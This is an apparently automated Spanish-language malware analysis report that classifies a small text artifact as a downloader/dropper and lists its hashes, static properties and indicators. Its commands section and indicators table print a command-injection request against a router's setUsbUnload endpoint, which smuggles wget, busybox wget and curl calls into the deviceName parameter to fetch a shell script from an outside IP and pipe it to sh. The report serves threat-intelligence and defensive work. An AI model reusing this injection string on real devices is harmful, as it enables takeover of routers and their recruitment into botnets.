# 🧬 Payload Analysis

`8aa1ff356eee383ddd135a6b5da72ad46738166a6c16c518bd0e185751e605b8`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8aa1ff356eee383ddd135a6b5da72ad46738166a6c16c518bd0e185751e605b8`
- **MD5:** `613408e8a669e103d0e95a6e3461ef0a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 295 B |
| Entropía | 5.17 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20tenda%3Bbusyb
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20tenda%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20tenda%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20tenda | strings |
| hash | 8aa1ff356eee383ddd135a6b5da72ad46738166a6c16c518bd0e185751e605b8 | static_analysis |
| command | GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20tenda%3Bbusyb | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
